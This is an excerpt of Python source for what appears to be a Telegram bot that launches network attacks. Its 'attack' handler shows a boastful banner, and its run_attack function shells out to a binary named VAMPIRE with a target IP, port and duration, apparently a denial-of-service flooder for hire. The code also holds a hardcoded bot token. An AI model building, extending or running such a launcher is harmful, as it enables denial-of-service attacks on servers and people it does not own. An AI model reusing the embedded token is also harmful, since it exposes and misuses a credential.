...
TELEGRAM_BOT_TOKEN = 'AAECDWxd7AbZYnUf3DuU6_tYtqETWdOxQYI'
...
async def attack(update: Update, context: CallbackContext):
    ...
    text=(
        ...
        f"*🔥ᴜɴʟᴇᴀꜱʜɪɴɢ ꜰᴏʀᴄᴇ. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by @TOXICPLAYER002 💥*"
    ), parse_mode='Markdown')
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./VAMPIRE {ip} {port} {duration} TOXIC",
